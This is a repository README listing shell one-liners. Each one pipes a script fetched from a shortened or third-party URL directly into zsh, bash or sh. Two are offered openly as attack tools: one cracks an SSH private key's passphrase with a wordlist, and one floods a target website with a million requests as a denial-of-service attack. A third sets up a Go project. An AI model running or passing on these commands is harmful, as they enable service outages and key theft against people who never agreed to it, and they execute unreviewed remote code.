# Magic oneliners

This repository is about bash/python/programming language oneliners that can do an incredible amount of work.

## Oneliners

* [Crack a ssh private key](https://raw.githubusercontent.com/4thel00z/oneliners/master/scripts/crack_ssh_password.zsh)

```
# Download via: 
curl  --proto '=https' --tlsv1.2 -L -sSf https://shortly.fun/crackssh | zsh -s <path-to-private-key> <path-to-wordlist> 

# or in case you haven't installed zsh yet or use fish 
curl  --proto '=https' --tlsv1.2 -L -sSf https://shortly.fun/crackssh | bash -s <path-to-private-key> <path-to-wordlist> 
```

* [Setup a cool go project template](https://github.com/4thel00z/service_templated)

```
# Ideally you do this in your ~/go/src/github.com/<your-gihub-username>/ or other smart places
curl  --proto '=https' --tlsv1.2 -L -sSf https://shortly.fun/boilerplate | bash -s <project_name>
```

* [DOS a webpage](http://gendos.site)

```
# What this does, is it downloads https://github.com/rakyll/hey for amd64 linux and shoots against the 'target.com'
curl -L "gendos.site?args=https://target.com%20-n=1000000" | sh
```

## License

This project is licensed under the GPL-3 license.
